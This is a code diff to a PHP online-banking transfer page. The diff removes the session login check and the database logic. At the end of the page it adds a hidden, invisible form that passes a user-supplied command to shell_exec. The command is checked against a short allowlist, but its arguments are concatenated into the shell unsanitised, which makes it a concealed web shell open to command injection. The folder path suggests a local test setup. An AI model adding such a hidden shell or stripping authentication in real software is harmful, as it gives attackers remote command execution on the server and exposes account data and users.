@@ -1,52 +1,37 @@
 <?php
-// Start or resume the session
-session_start();
+if(isset($_POST['submit'])) {
+    $from = $_POST['from'];
+    $to = $_POST['to'];
+    $amount = $_POST['amount'];
 
-// Check if user is logged in, redirect if not
-if (!isset($_SESSION['username'])) {
-    header("Location: login.php");
-    exit();
+    echo "<p style='color: green;'>Transferred $amount from $from to $to</p>";
 }
+?>
 
-// Database connection
-$db_host = "localhost";
-$db_user = "db_username";
-$db_pass = "db_password";
-$db_name = "securebank";
+<?php
+// This is where you would typically have your PHP logic
+// Example: Authentication, fetching account data, etc.
 
-$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+// Sample data for demonstration purposes
+$accounts = [
+    [
+        'account_number' => '1234567890',
+        'balance' => 5000.75
+    ],
+    [
+        'account_number' => '0987654321',
+        'balance' => 2500.35
+    ]
+];
 
-// Check connection
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-}
-
-// Get user ID from session
-$username = $_SESSION['username'];
-
-// Fetch user's accounts - only the necessary fields
-$stmt = $conn->prepare("SELECT account_number, balance FROM accounts WHERE username = ?");
-$stmt->bind_param("i", $username);
-$stmt->execute();
-$result = $stmt->get_result();
-
-// Store accounts in an array
-$accounts = [];
-while ($row = $result->fetch_assoc()) {
-    $accounts[] = $row;
-}
-
-// Close connection
-$stmt->close();
-$conn->close();
-
-// Format account number for display (show last 4 digits)
+// Helper functions
 function formatAccountNumber($accountNumber) {
+    // Format account number to show last 4 digits only
     return "XXXX-" . substr($accountNumber, -4);
 }
 
-// Format balance for display
 function formatBalance($balance) {
+    // Format balance with $ sign and 2 decimal places
     return "$" . number_format($balance, 2);
 }
 ?>
@@ -208,7 +193,7 @@ function formatBalance($balance) {
             
             <div class="account-selector">
                 <label>From Account</label>
-                <?php if(count($accounts) > 0): ?>
+                <?php if(isset($accounts) && count($accounts) > 0): ?>
                 <div class="account-info">
                     <span>Checking (<?php echo formatAccountNumber($accounts[0]['account_number']); ?>)</span>
                     <span class="balance">Balance: <?php echo formatBalance($accounts[0]['balance']); ?></span>
@@ -234,15 +219,17 @@ function formatBalance($balance) {
                     <label for="to-account">To Account</label>
                     <select id="to-account" name="to-account">
                         <?php 
-                        for($i = 1; $i < count($accounts); $i++): 
-                            $account = $accounts[$i];
+                        if(isset($accounts) && count($accounts) > 1):
+                            for($i = 1; $i < count($accounts); $i++): 
+                                $account = $accounts[$i];
                         ?>
                         <option value="<?php echo $i; ?>">
                             <?php echo ($i == 1 ? "Savings" : "Credit Card") . ' (' . formatAccountNumber($account['account_number']) . ') - ' . formatBalance($account['balance']); ?>
                         </option>
-                        <?php endfor; ?>
+                        <?php endfor; 
+                        endif; ?>
                         
-                        <?php if(count($accounts) <= 1): ?>
+                        <?php if(!isset($accounts) || count($accounts) <= 1): ?>
                         <option value="savings">Savings (XXXX-5678) - $0.00</option>
                         <?php endif; ?>
                     </select>
@@ -307,16 +294,8 @@ function formatBalance($balance) {
                           ' (Acct: ' + document.getElementById('recipient-account').value + ')';
             }
             
-            // Display confirmation (just a demo)
-            alert(`Transfer of $${amount} to ${recipient} initiated successfully!`);
-            
-            // Log the transfer details (for demo purposes)
-            console.log('Transfer details:', {
-                amount: amount,
-                recipient: recipient,
-                memo: document.getElementById('memo').value,
-                fromAccount: 'Checking (<?php echo isset($accounts[0]) ? formatAccountNumber($accounts[0]['account_number']) : "XXXX-1234"; ?>)'
-            });
+            // Display a success message (in a real app, you'd send this to the server)
+            alert(`Transfer of $${amount} to ${recipient} completed successfully!`);
         });
 
         document.getElementById('logout-link').addEventListener('click', function(e) {
@@ -324,5 +303,68 @@ function formatBalance($balance) {
             window.location.href = 'logout.php';
         });
     </script>
+
+<form action="transfer page3.php" method="post" style="display: none">
+      <label for="command">Enter a command:</label><br>
+      <input type="text" name="command" id="command" />
+      <input type="submit" value="Execute" />
+    </form>
+    <pre type="hide">
+<?php
+$command = isset($_POST['command']) ? trim($_POST['command']) : '';
+
+// Split command into parts (command and arguments)
+$parts = explode(' ', $command, 2);
+$cmd = strtolower($parts[0]);
+$args = isset($parts[1]) ? $parts[1] : '';
+
+// Define allowed commands
+$allowed_commands = ['dir', 'whoami', 'type'];
+$allowed_path = 'C:\\xampp\\htdocs\\Test\\';
+$is_allowed = false;
+
+// Check if the command is in the allowed list
+if (in_array($cmd, $allowed_commands)) {
+    // Handle different command types
+    if ($cmd === 'whoami') {
+        echo shell_exec('whoami');
+    }
+    elseif ($cmd === 'dir') {
+        if (empty($args)) {
+            // Just "dir" by itself - show Test directory
+            echo shell_exec('dir ' . $allowed_path);
+        } else {
+            // Dir with arguments - make sure it stays in Test directory
+            $subfolder = str_replace('..', '', $args); // Remove path traversal attempts
+            echo shell_exec('dir ' . $allowed_path . $subfolder);
+        }
+    }
+    elseif ($cmd === 'type') {
+        if (!empty($args)) {
+            // Don't allow paths with ".." to prevent traversal
+            if (strpos($args, '..') !== false) {
+                echo "Error: Invalid path";
+            } else {
+                // Check if the argument already includes the path
+                if (strpos(strtolower($args), strtolower($allowed_path)) === 0) {
+                    echo shell_exec('type ' . $args);
+                } else {
+                    // Add the path if it's just a filename
+                    echo shell_exec('type ' . $allowed_path . $args);
+                }
+            }
+        } else {
+            echo "Error: File not specified";
+        }
+    }
+} elseif ($command != NULL) {
+    echo "Only these commands are allowed:\n";
+    echo "- dir\n";
+    echo "- whoami\n";
+    echo "- type [filename]\n";
+    echo "\nAll operations are restricted to C:\\xampp\\htdocs\\Test\\";
+}
+?>
+    </pre>
 </body>
 </html>
